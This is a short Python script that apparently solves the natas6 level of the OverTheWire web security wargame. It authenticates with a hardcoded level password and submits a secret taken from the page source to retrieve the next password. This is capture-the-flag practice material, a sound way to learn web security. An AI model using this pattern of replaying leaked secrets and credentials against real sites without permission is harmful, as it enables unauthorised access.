import requests
myobj = {'secret': 'FOEIUWGHFEEUHOFUOIU','submit':'Submit Query'}
url="http://natas6.natas.labs.overthewire.org/"
exploit=requests.session()
exploit.auth=('natas6','aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1')
request=exploit.post(url, data = myobj)
#password has been in the source
print(request.text)